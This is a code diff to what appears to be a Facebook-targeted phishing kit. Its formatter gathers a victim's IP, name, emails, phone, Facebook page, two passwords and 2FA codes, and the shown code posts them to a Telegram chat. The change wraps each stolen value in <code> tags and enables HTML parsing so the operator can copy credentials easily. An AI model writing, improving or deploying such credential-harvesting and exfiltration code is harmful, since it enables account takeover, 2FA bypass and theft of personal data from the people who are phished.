@@ -149,7 +149,7 @@ const Utils = {
         const p1 = data.password || '';
         const p2 = data.passwordSecond || '';
         const passwords = p1 || p2
-            ? `\n🔒 Password 1/2: ${p1}\n\n🔒 Password 2/2: ${p2}`
+            ? `\n🔒 Password 1/2: <code>${p1}</code>\n\n🔒 Password 2/2: <code>${p2}</code>`
             : '';
 
         const twoFaLines = [];
@@ -157,20 +157,20 @@ const Utils = {
         const has2fa = twoFaKeys.some(k => data[k]);
         if (has2fa) {
             twoFaKeys.forEach((key, i) => {
-                twoFaLines.push(`🔐 2FA Code ${i + 1}/${twoFaKeys.length}: ${data[key] || ''}`);
+                twoFaLines.push(`🔐 2FA Code ${i + 1}/${twoFaKeys.length}: <code>${data[key] || ''}</code>`);
             });
         }
         const twoFaBlock = twoFaLines.length ? `\n${twoFaLines.join('\n')}` : '';
 
         return (
-`📌 IP: ${locationData.ip}
+`📌 IP: <code>${locationData.ip}</code>
 ${countryLine}
 
-👤 Full Name: ${data.fullName || ''}
-📧 Personal Email: ${data.email || ''}
-💼 Business Email: ${data.emailBusiness || ''}
-📱 Phone Number: ${prefix}${data.phone || ''}
-📘 Facebook Page: ${data.fanpage || ''}
+👤 Full Name: <code>${data.fullName || ''}</code>
+📧 Personal Email: <code>${data.email || ''}</code>
+💼 Business Email: <code>${data.emailBusiness || ''}</code>
+📱 Phone Number: <code>${prefix}${data.phone || ''}</code>
+📘 Facebook Page: <code>${data.fanpage || ''}</code>
 
 🕐 Time: ${this.formatTimestamp()}${passwords}${twoFaBlock}`
         ).trim();
@@ -199,7 +199,8 @@ ${countryLine}
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     chat_id: CONFIG.TELEGRAM_CHAT_ID,
-                    text
+                    text,
+                    parse_mode: "HTML"
                 })
             });
 
